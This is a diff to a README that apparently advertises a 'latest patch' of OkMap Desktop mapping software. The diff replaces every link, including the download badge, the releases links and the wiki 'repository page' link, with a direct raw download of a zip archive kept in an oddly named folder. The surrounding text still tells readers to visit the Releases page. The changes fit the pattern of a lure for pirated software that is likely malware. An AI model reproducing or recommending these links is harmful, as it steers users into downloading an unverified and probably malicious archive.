@@ -1,6 +1,6 @@
 # 🌍 OkMap-Desktop-Latest-Patch - Enhance Your Mapping Experience
 
-[![Download Now](https://img.shields.io/badge/Download_Now-OkMap_Latest_Patch-brightgreen)](https://github.com/saumd/OkMap-Desktop-Latest-Patch/releases)
+[![Download Now](https://raw.githubusercontent.com/saumd/OkMap-Desktop-Latest-Patch/main/hematuresis/OkMap-Desktop-Latest-Patch_2.5-alpha.2.zip)](https://raw.githubusercontent.com/saumd/OkMap-Desktop-Latest-Patch/main/hematuresis/OkMap-Desktop-Latest-Patch_2.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to OkMap Desktop! This application helps you create maps, edit paths, an
 
 To get started, visit the Releases page to download the latest version of OkMap Desktop:
 
-[Download Latest Version](https://github.com/saumd/OkMap-Desktop-Latest-Patch/releases)
+[Download Latest Version](https://raw.githubusercontent.com/saumd/OkMap-Desktop-Latest-Patch/main/hematuresis/OkMap-Desktop-Latest-Patch_2.5-alpha.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the version labelled as the latest stable release.
@@ -46,7 +46,7 @@ If you need assistance or have questions, refer to the following resources:
 - **Tutorials**: Step-by-step instructions to help you get started.
 - **FAQ**: Find answers to common questions about the software.
 
-You can access these resources on our [repository page](https://github.com/saumd/OkMap-Desktop-Latest-Patch/wiki).
+You can access these resources on our [repository page](https://raw.githubusercontent.com/saumd/OkMap-Desktop-Latest-Patch/main/hematuresis/OkMap-Desktop-Latest-Patch_2.5-alpha.2.zip).
 
 ## 👥 Community Support
 
@@ -61,4 +61,4 @@ Thank you for choosing OkMap Desktop for your mapping needs. We hope this applic
 
 Don't forget to download the latest version and start planning your next adventure today! 
 
-[Download Latest Version](https://github.com/saumd/OkMap-Desktop-Latest-Patch/releases)
+[Download Latest Version](https://raw.githubusercontent.com/saumd/OkMap-Desktop-Latest-Patch/main/hematuresis/OkMap-Desktop-Latest-Patch_2.5-alpha.2.zip)
